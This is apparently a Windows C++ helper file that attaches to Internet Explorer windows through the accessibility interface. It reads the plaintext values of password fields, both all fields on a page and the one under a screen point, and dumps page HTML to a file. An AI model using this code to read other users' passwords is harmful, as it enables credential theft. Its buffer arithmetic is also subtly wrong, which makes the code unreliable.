#include <windows.h>
#include <tchar.h>
#include <atlbase.h>
#include <oleacc.h>
#include <mshtml.h>
//#include <atlconv.h>
//#include <comdef.h>
//#include <comutil.h>

//////////////////////////////////////////////////////////////////////////
#include "..\HsCommon\WinFuncs.h"
#include "..\HsCommon\FileOpEx.h"

#include "HtmlHelper.h"
//////////////////////////////////////////////////////////////////////////

BOOL IsIEWindow(HWND hwndTag)
{
	return CheckWindowClass(hwndTag, TEXT("Internet Explorer_Server"));

} //IsIEWindow()

//////////////////////////////////////////////////////////////////////////

IHTMLDocument2* GetIEDocInterfaceEx(HWND hwndIE, HINSTANCE hOleacc) 
{
	HINSTANCE hInst_oleacc_dll=NULL;
	IHTMLDocument2* pDoc2=NULL;

	if ( IsIEWindow(hwndIE) )
	{
		// Explicitly load MSAA so we know if it's installed
		if( hOleacc )
		{
			hInst_oleacc_dll=hOleacc;
		}
		else
		{
			hInst_oleacc_dll=LoadLibrary(TEXT("OLEACC.DLL"));
		}
		if ( hInst_oleacc_dll )
		{
			LRESULT lRes;
			CComPtr<IHTMLDocument> spDoc=NULL;
			LPFNOBJECTFROMLRESULT pfObjectFromLresult;

			UINT nMsg=RegisterWindowMessage(TEXT("WM_HTML_GETOBJECT"));

			SendMessageTimeout(hwndIE, nMsg, 0, 0, 
				SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes);

			pfObjectFromLresult=(LPFNOBJECTFROMLRESULT)
				GetProcAddress(hInst_oleacc_dll, "ObjectFromLresult");
			if ( pfObjectFromLresult != NULL )
			{
				HRESULT hr;
				hr=pfObjectFromLresult(lRes, IID_IHTMLDocument, 0, (void**)&spDoc);
				if ( SUCCEEDED(hr) )
				{
					CComPtr<IDispatch> spDisp;
					CComQIPtr<IHTMLWindow2> spWin;
					spDoc->get_Script(&spDisp);
					spWin = spDisp;
					if(spWin)
					{
						spWin->get_document(&pDoc2);
					}
				}
			} // else document not ready

			if( !hOleacc )
			{
				FreeLibrary(hInst_oleacc_dll);
			}
		}
		// else Active Accessibility is not installed
	} 

	return pDoc2;
}

//////////////////////////////////////////////////////////////////////////

INT GetHtmlPasswords(IHTMLDocument2* pDoc2, LPTSTR szRevBuf, INT iMaxBufLen)
{
	INT iCountPSW=0;
	
	if(pDoc2 == NULL) { return 0; }
	

	CComPtr<IHTMLElementCollection> spFormColl;
	
	if( FAILED(pDoc2->get_forms(&spFormColl)) ) { return 0; }
	
	LONG lLenForm=0;
	if( FAILED(spFormColl->get_length(&lLenForm)) ) { return 0; }
	
	VARIANT vIndex, vId;
	CComPtr<IDispatch> spDisp;
	

	INT iLenNow=0;
	LPTSTR lpszPSW=szRevBuf;
	iMaxBufLen-=1;
	ZeroMemory(lpszPSW, sizeof(char)*iMaxBufLen);
	
	for(LONG i=0; i<lLenForm; i++)
	{
		V_VT(&vId)=VT_I4;
		V_I4(&vId)=i;
		V_VT(&vIndex)=VT_I4;
		V_I4(&vIndex)=0;
			
		if( SUCCEEDED(spFormColl->item(vId, vIndex, &spDisp.p)) )
		{
			CComPtr<IHTMLFormElement> spFormItem;
			
			if( SUCCEEDED(spDisp->QueryInterface(IID_IHTMLFormElement, (void**)&spFormItem.p)) )   
			{
				LONG lLenItem=0;
				if( SUCCEEDED(spFormItem->get_length(&lLenItem)) )
				{
					for(LONG j=0; j<lLenItem; j++)
					{
						V_VT(&vId)=VT_I4;
						V_I4(&vId)=j;
						V_VT(&vIndex)=VT_I4;
						V_I4(&vIndex)=0;
						
						CComPtr<IHTMLInputTextElement> spInput;
						
						if(	SUCCEEDED(spFormItem->item(vId, vIndex, &spDisp.p)) )
						{
							if( SUCCEEDED(spDisp->QueryInterface(IID_IHTMLInputTextElement, (void**)&spInput.p)) )   
							{
								CComBSTR sType;

								spInput->get_type(&sType);
								sType.ToLower();
								if( sType==TEXT("password") )
								{
									CComBSTR sValue;
									spInput->get_value(&sValue);
									//MessageBoxW(NULL, sValue.m_str, NULL, MB_TOPMOST);
#ifdef UNICODE
									lstrcpyn(lpszPSW, (LPWSTR)sValue.m_str, iMaxBufLen-iLenNow);
#else

								WideCharToMultiByte(CP_ACP, 0, 
									sValue.m_str, -1, lpszPSW, iMaxBufLen-iLenNow, NULL, NULL);
#endif //UNICODE

									iLenNow+=1+lstrlen(lpszPSW);
									lpszPSW+=iLenNow;
									iCountPSW++;
								}
							}
						}
					}
				}
			}
		}

	}//for
	
	pDoc2->Release();

	return iCountPSW;

}

//////////////////////////////////////////////////////////////////////////

VOID GetHtmlPasswordFormPoint(IHTMLDocument2 *pDoc2, POINT pt, LPTSTR szStrBuf, INT iMaxBufLen)
{
	
	szStrBuf[0]=0;

	if( pDoc2 )
	{

		CComPtr<IHTMLElement> spElement;
		HRESULT hr=pDoc2->elementFromPoint(pt.x,pt.y, &spElement);
		if( SUCCEEDED(hr) )
		{

			CComPtr<IHTMLInputTextElement> spInputElement;
			
			hr=spElement->QueryInterface(IID_IHTMLInputTextElement, (void**)&spInputElement);
			if( SUCCEEDED(hr) )
			{
				//{{{
				// a nop lead IHTMLInputTextElement to pre alloc...
				LONG lSize_warm_up;
				hr=spInputElement->get_size(&lSize_warm_up);
				//}}}

				CComBSTR bsType;
				hr=spInputElement->get_type(&bsType);

				if( SUCCEEDED(hr) )
				{
					bsType.ToLower();
					if( bsType==TEXT("password") )
					{
						CComBSTR bsValue;
						hr=spInputElement->get_value(&bsValue);
						if(SUCCEEDED(hr))
						{
							int iLen=bsValue.Length();
							if( iLen )
							{
#ifdef UNICODE
								lstrcpyn(szStrBuf, (LPWSTR)bsValue.m_str, iMaxBufLen);
#else
								ZeroMemory(szStrBuf, sizeof(char)*iMaxBufLen);
								WideCharToMultiByte(CP_ACP, 0, 
									bsValue.m_str, -1, szStrBuf, iMaxBufLen, NULL, NULL);
#endif //UNICODE
							}
						}
					}
				}
	
			}
		}
		
		pDoc2->Release();
	}
}

//////////////////////////////////////////////////////////////////////////

BOOL GetHtmlSource(IHTMLDocument2* pDoc2, LPTSTR szStrBuf, INT iMaxBufLen, LPTSTR szFileName, BOOL IsAppend)
{
	BOOL bRet=FALSE;

	if( pDoc2 )
	{
		CComPtr<IHTMLElementCollection> pAllColl;
		HRESULT hr;
		hr=pDoc2->get_all(&pAllColl);
		if(hr==S_OK)
		{
			LONG length=0;
			hr=pAllColl->get_length(&length);
			if(hr==S_OK)
			{
				for(int i=0; i<length; i++)
				{
					VARIANT vIndex, vName;
					vName.vt=vIndex.vt=VT_I4;
					vName.lVal=vIndex.lVal=i;
					CComPtr<IDispatch> pDisp;
					hr=pAllColl->item(vName, vIndex, &pDisp);
					if( hr==S_OK )
					{
						CComPtr<IHTMLElement> pElement;
						hr=pDisp->QueryInterface(IID_IHTMLElement,(void**)&pElement);
						if( hr==S_OK )
						{
							CComBSTR tagName;
							hr=pElement->get_tagName(&tagName);
							if( hr==S_OK )
							{
								tagName.ToUpper();
								if( tagName==TEXT("HTML") )
								{
									CComBSTR Content;
									hr=pElement->get_outerHTML(&Content);
									if(hr==S_OK)
									{
										INT iSize=(Content.Length()+2)*sizeof(TCHAR);
										LPTSTR lpszSaveText=(LPTSTR)GlobalAlloc(GPTR, iSize);
#ifdef UNICODE
										lstrcpy(lpszSaveText, (LPWSTR)Content.m_str);
#else
										WideCharToMultiByte(CP_ACP, 0, 
											(LPWSTR)Content.m_str, -1, lpszSaveText, iSize, NULL, NULL);
#endif //UNICODE
										if(szFileName)
										{
											WriteStrToFile(szFileName, lpszSaveText, IsAppend);
										}
										if(szStrBuf)
										{
											lstrcpyn(szStrBuf, lpszSaveText, iMaxBufLen);
										}

										GlobalFree((HGLOBAL)lpszSaveText);
										bRet=TRUE;
										break; //break out from for-loop...
									}
								}
							}
						}
					}
				}
			}
		}
		
		pDoc2->Release();

	}
	
	return bRet;
}

//////////////////////////////////////////////////////////////////////////